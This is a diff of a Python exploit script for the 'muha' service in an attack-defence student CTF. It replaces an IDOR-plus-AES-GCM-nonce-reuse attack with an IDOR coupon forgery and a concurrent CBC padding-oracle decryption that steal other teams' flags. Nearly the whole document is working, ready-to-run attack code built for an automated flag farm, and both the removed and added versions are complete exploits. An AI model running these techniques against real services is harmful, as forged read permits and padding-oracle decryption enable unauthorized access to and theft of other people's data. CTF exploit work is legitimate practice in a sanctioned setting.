@@ -1,200 +1,208 @@
-"""Farm exploit for the `muha` service (real Team7 range box, Python/Flask).
+"""muha exploit — A&D Student CTF 2026, service "МУХА" (:8000).
 
-Service = "fly brain lab": users own flies, flies hold AES-GCM-encrypted memories;
-the checker plants the flag as a memory's `content`. flag_id (from attack_data) is
-the public memory id (`mid`) of the flagged memory.
+Two independent bugs (confirmed from the service source on our own vulnbox):
 
-Two independent steal paths (whichever the target team has NOT patched), tried in
-order; both need only a freshly registered account and the public interface:
+1) coupon-forge IDOR: POST /api/coupons signs a read-permit document
+   {subject: caller, object_id: <ANY string>} without checking object_id belongs to
+   the caller. POST /api/memories/<mid>/read admits a non-owner whose signed document
+   has subject==caller and object_id==mid. => forge a coupon over the victim memory,
+   read it. (Cheap; patched on some boxes.)
 
-  A) COUPON-FORGE IDOR (fast, ~3 req).  POST /api/coupons signs an HMAC read-permit
-     for ANY object_id supplied by the caller without checking ownership; then
-     POST /api/memories/<mid>/read accepts that permit (subject==caller, object_id==mid)
-     and returns the decrypted content. => forge a permit for the victim's mid, read it.
+2) CBC padding oracle: GET /api/memories/<mid>/capsule leaks any memory's `archive`
+   (IDOR) — AES-CBC(iv+ct) of JSON {"owner","title","content"} under one shared
+   archive_key. POST /api/archives/preview returns 422 on bad PKCS7 padding but a
+   different status otherwise, a textbook padding oracle: recover `content` (the flag)
+   from the archive without the key, no ownership needed.
 
-  B) CAPSULE + CLONE + AES-GCM NONCE REUSE (crypto fallback, ~5 req).
-     GET /api/memories/<mid>/capsule leaks the victim's ciphertext + nonce (nonce =
-     fly counter at store time). POST /api/flies/<victim_fid>/clone has NO ownership
-     check and copies the victim's per-fly brain_key into a fly we own, with counter
-     set to `revision` (we pick it = R, the victim memory's index). Storing our own
-     memory in that clone encrypts a KNOWN plaintext under the SAME (key, nonce),
-     so keystream = P1 XOR C1, and flag = C_victim XOR keystream.
-
-Interface frozen by the farm:  exploit(host, port, flag_id) -> list[str]
-Standalone:  python muha.py <host> <port> <flag_id>
+flag_id = ForcAD attack-data hint, JSON string {"fly_id":..,"memory_id":..}.
 """
 import base64
+import concurrent.futures as _cf
+import json
 import re
 import secrets
 import sys
+import threading
+import time
+import urllib.error
+import urllib.request
+import http.cookiejar
 
-import requests
-
-FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
-MID_RE = re.compile(r"^[0-9a-f]{24}$")
 TIMEOUT = 5
-MAX_DUMP_MEMORIES = 20          # cap for flag_id-less dump-all (stay under farm timeout)
+ORACLE_WORKERS = 32          # sockets per in-flight exploit; keep farm max_workers low
+ORACLE_BUDGET = 30.0         # wall-clock seconds for one memory's padding-oracle run
+FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
 
 
-def _rand(n=16):
-    return secrets.token_hex(n // 2 + 1)[:n]
+def _client():
+    cj = http.cookiejar.CookieJar()
+    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+
+
+def _call(op, url, data=None, timeout=TIMEOUT):
+    body = json.dumps(data).encode() if data is not None else None
+    req = urllib.request.Request(
+        url, data=body, headers={"Content-Type": "application/json"},
+        method="POST" if data is not None else "GET")
+    try:
+        r = op.open(req, timeout=timeout)
+        return r.status, json.loads(r.read().decode("utf-8", "replace"))
+    except urllib.error.HTTPError as e:
+        try:
+            return e.code, json.loads(e.read().decode("utf-8", "replace"))
+        except Exception:
+            return e.code, {}
+    except Exception:
+        return 0, {}
+
+
+def _status(op, url, data):
+    """Return just the HTTP status of a preview call (padding oracle)."""
+    body = json.dumps(data).encode()
+    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
+    try:
+        return op.open(req, timeout=TIMEOUT).status
+    except urllib.error.HTTPError as e:
+        return e.code
+    except Exception:
+        return 0
+
+
+def _hint(flag_id):
+    if isinstance(flag_id, dict):
+        return flag_id
+    if isinstance(flag_id, str):
+        try:
+            return json.loads(flag_id)
+        except Exception:
+            return {"memory_id": flag_id}
+    return {}
+
+
+def _b64u(data):
+    return base64.urlsafe_b64encode(data).decode().rstrip("=")
 
 
 def _unb64(value):
-    # muha emits urlsafe base64 without padding (b64 = urlsafe_b64encode(...).rstrip("="))
-    s = str(value)
-    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+    value = value.strip().replace("-", "+").replace("_", "/")
+    return base64.b64decode(value + "=" * (-len(value) % 4))
 
 
-def _xor(a, b):
-    return bytes(x ^ y for x, y in zip(a, b))
+def _register(op, base):
+    u = "fw" + secrets.token_hex(8)
+    sc, me = _call(op, base + "/api/register", {"username": u, "password": "brainworm-" + secrets.token_hex(5)})
+    return me.get("id") if sc in (200, 201) and isinstance(me, dict) else None
 
 
-def _session(base):
-    """Register a throwaway account; returns a requests.Session with its cookie, or None."""
-    s = requests.Session()
-    u, p = "lab" + _rand(10), _rand(20)
+def _try_coupon(op, base, mid):
+    sc, fly = _call(op, base + "/api/flies", {"name": "w", "profession": "Диджей"})
+    if "id" not in fly:
+        return []
+    sc, cp = _call(op, base + "/api/coupons", {"fly_id": fly["id"], "object_id": mid})
+    token = cp.get("token") if isinstance(cp, dict) else None
+    if not token:
+        return []
+    sc, rd = _call(op, base + "/api/memories/%s/read" % mid, {"token": token})
+    out = []
+    if isinstance(rd, dict):
+        for v in rd.values():
+            if isinstance(v, str):
+                out += FLAG_RE.findall(v)
+    return out
+
+
+def _oracle_valid(op, url, prefix16, ct_block):
+    # valid PKCS7 padding => server does NOT return 422
+    return _status(op, url, {"archive": _b64u(bytes(prefix16) + bytes(ct_block))}) != 422
+
+
+def _find_byte(op, url, forged, idx, ct, candidates):
+    """Return every candidate byte at position idx that yields valid padding (concurrent)."""
+    hits = []
+    lock = threading.Lock()
+
+    def check(b):
+        f = bytearray(forged)
+        f[idx] = b
+        if _oracle_valid(op, url, f, ct):
+            with lock:
+                hits.append(b)
+    with _cf.ThreadPoolExecutor(max_workers=ORACLE_WORKERS) as ex:
+        list(ex.map(check, candidates))
+    return hits
+
+
+def _decrypt_block(op, url, prev, ct, deadline):
+    """CBC padding oracle: recover one plaintext block (prev=preceding ciphertext/IV)."""
+    inter = bytearray(16)   # D(ct)
+    forged = bytearray(16)
+    for pad in range(1, 17):
+        if time.time() > deadline:
+            return None
+        idx = 16 - pad
+        hits = _find_byte(op, url, forged, idx, ct, range(256))
+        if pad == 1 and (len(hits) == 0 or len(hits) > 6):
+            # no discrimination => preview is not a padding oracle (patched/uniform errors)
+            return None
+        chosen = None
+        if pad == 1 and len(hits) > 1:
+            # disambiguate the real 0x01 from an accidental 0x02 0x02..
+            for b in hits:
+                f = bytearray(forged); f[idx] = b; f[idx - 1] ^= 0xFF
+                if _oracle_valid(op, url, f, ct):
+                    chosen = b
+                    break
+        if chosen is None:
+            chosen = hits[0] if hits else None
+        if chosen is None:
+            return None
+        inter[idx] = chosen ^ pad
+        for j in range(idx, 16):            # re-seed tail for the next pad value
+            forged[j] = inter[j] ^ (pad + 1)
+    return bytes(inter[i] ^ prev[i] for i in range(16))
+
+
+def _padding_oracle(op, base, mid):
+    sc, cap = _call(op, base + "/api/memories/%s/capsule" % mid)
+    if not isinstance(cap, dict) or not cap.get("archive"):
+        return []
     try:
-        r = s.post(base + "/api/register", json={"username": u, "password": p}, timeout=TIMEOUT)
-        if r.status_code not in (200, 201):
-            # username clash or already-registered edge: try logging in
-            r = s.post(base + "/api/login", json={"username": u, "password": p}, timeout=TIMEOUT)
-            if r.status_code != 200:
-                return None
-    except requests.RequestException:
-        return None
-    return s
-
-
-def _make_fly(s, base):
-    try:
-        r = s.post(base + "/api/flies", json={"name": _rand(8), "profession": "qa"}, timeout=TIMEOUT)
-        if r.status_code == 201:
-            return r.json().get("id")
-    except (requests.RequestException, ValueError):
-        pass
-    return None
-
-
-def _memories_of(s, base, fid):
-    try:
-        r = s.get(base + "/api/flies/%s/memories" % fid, timeout=TIMEOUT)
-        if r.status_code == 200:
-            return [m["id"] for m in r.json().get("memories", []) if m.get("id")]
-    except (requests.RequestException, ValueError, KeyError):
-        pass
-    return []
-
-
-def _public_flies(s, base):
-    try:
-        r = s.get(base + "/api/flies", params={"scope": "public"}, timeout=TIMEOUT)
-        if r.status_code == 200:
-            return [f["id"] for f in r.json().get("flies", []) if f.get("id")]
-    except (requests.RequestException, ValueError, KeyError):
-        pass
-    return []
-
-
-def _path_a(s, base, my_fid, mid):
-    """Coupon-forge IDOR: sign a permit for the victim mid, then read it."""
-    if not my_fid:
-        return None
-    try:
-        r = s.post(base + "/api/coupons", json={"fly_id": my_fid, "object_id": mid}, timeout=TIMEOUT)
-        if r.status_code != 200:
-            return None
-        token = r.json().get("token")
-        if not token:
-            return None
-        r = s.post(base + "/api/memories/%s/read" % mid, json={"token": token}, timeout=TIMEOUT)
-        if r.status_code != 200:
-            return None
-        return r.json().get("content")
-    except (requests.RequestException, ValueError, KeyError):
-        return None
-
-
-def _path_b(s, base, mid):
-    """capsule leak + clone (brain_key copy) + AES-GCM nonce reuse -> recover plaintext."""
-    try:
-        r = s.get(base + "/api/memories/%s/capsule" % mid, timeout=TIMEOUT)
-        if r.status_code != 200:
-            return None
-        j = r.json()
-        victim_fid = j["fly_id"]
-        nonce = _unb64(j["nonce"])
-        ct_victim = _unb64(j["ciphertext"])          # ciphertext already excludes the 16-byte tag
-        revision = int.from_bytes(nonce, "big")       # nonce == fly counter at store time == mem index
-
-        r = s.post(base + "/api/flies/%s/clone" % victim_fid,
-                   json={"name": _rand(8), "revision": revision}, timeout=TIMEOUT)
-        if r.status_code != 201:
-            return None
-        my_fid = r.json()["id"]
-
-        p1 = "A" * min(4096, max(256, len(ct_victim) + 32))   # known plaintext (<=4096 content cap)
-        r = s.post(base + "/api/flies/%s/memories" % my_fid,
-                   json={"title": "k", "content": p1}, timeout=TIMEOUT)
-        if r.status_code != 201:
-            return None
-        my_mid = r.json()["id"]
-
-        r = s.get(base + "/api/memories/%s/capsule" % my_mid, timeout=TIMEOUT)
-        if r.status_code != 200:
-            return None
-        ct_mine = _unb64(r.json()["ciphertext"])
-        ks = _xor(p1.encode(), ct_mine)               # keystream = P1 XOR C1 (same key+nonce)
-        return _xor(ct_victim, ks).decode("utf-8", "ignore")
-    except (requests.RequestException, ValueError, KeyError, TypeError):
-        return None
-
-
-def _harvest(text, out):
-    if not text:
-        return
-    for m in FLAG_RE.findall(text):
-        out.add(m)
+        raw = _unb64(cap["archive"])
+    except Exception:
+        return []
+    if len(raw) < 32 or len(raw) % 16:
+        return []
+    url = base + "/api/archives/preview"
+    blocks = [raw[i:i + 16] for i in range(0, len(raw), 16)]  # blocks[0] = IV
+    plain = b""
+    deadline = time.time() + ORACLE_BUDGET
+    # decrypt from the LAST block backwards; the flag lives in "content" at the tail
+    for k in range(len(blocks) - 1, 0, -1):
+        pt = _decrypt_block(op, url, blocks[k - 1], blocks[k], deadline)
+        if pt is None:
+            break
+        plain = pt + plain
+        m = FLAG_RE.search(plain.decode("utf-8", "replace"))
+        if m:
+            return [m.group(0)]
+    return FLAG_RE.findall(plain.decode("utf-8", "replace"))
 
 
 def exploit(host, port, flag_id):
-    base = "http://%s:%d" % (host, int(port))
-    flags = set()
-
-    s = _session(base)
-    if s is None:
+    hint = _hint(flag_id)
+    mid = hint.get("memory_id") or hint.get("id")
+    if not mid:
         return []
-    my_fid = _make_fly(s, base)                        # needed for path A (coupon fly_id ownership)
-
-    # Build the candidate memory-id list.
-    mids = []
-    if flag_id and MID_RE.match(str(flag_id)):
-        mids.append(str(flag_id))                      # flag_id is most likely the memory id
-        mids.extend(_memories_of(s, base, str(flag_id)))   # ...or a fly id: pull its memories too
-    else:
-        for fid in _public_flies(s, base):
-            mids.extend(_memories_of(s, base, fid))
-
-    seen = set()
-    for mid in mids:
-        if mid in seen:
-            continue
-        seen.add(mid)
-        if len(seen) > MAX_DUMP_MEMORIES and not (flag_id and MID_RE.match(str(flag_id))):
-            break
-        content = _path_a(s, base, my_fid, mid)
-        if not content or not FLAG_RE.search(content):
-            content = _path_b(s, base, mid)
-        _harvest(content, flags)
-        if flag_id and flags:                          # targeted call: stop as soon as we have it
-            break
-
-    return list(flags)
+    base = "http://%s:%d" % (host, int(port))
+    op = _client()
+    if _register(op, base) is None:
+        return []
+    flags = _try_coupon(op, base, mid)      # cheap first; works on unpatched coupon
+    if flags:
+        return list(dict.fromkeys(flags))
+    flags = _padding_oracle(op, base, mid)  # fallback: works while capsule+preview leak
+    return list(dict.fromkeys(flags))
 
 
 if __name__ == "__main__":
-    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
-    pt = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
-    fid = sys.argv[3] if len(sys.argv) > 3 else None
-    for f in exploit(h, pt, fid):
-        print(f)
+    print(exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3] if len(sys.argv) > 3 else None))
